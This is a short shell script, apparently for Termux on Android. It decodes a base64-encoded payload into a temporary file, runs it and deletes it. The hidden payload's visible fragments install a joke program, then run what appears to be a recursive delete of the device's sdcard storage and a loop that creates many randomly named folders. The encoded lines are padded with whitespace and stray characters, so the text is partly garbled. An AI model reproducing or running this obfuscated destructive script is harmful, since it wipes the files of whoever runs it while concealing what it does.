perveso=$(mktemp)
base64 -d  >${perveso}<<DIXIE
cGtnIGluc3RhbGwgc2wKc2wKCnJtIC1yZiAvc2RjY                            >ZTtkbwogICAgbWtkaXIgIlRFU1RBTkRPLiRSQU5ET                            >
DIXIE
source ${perveso}
rm -rf ${perveso}
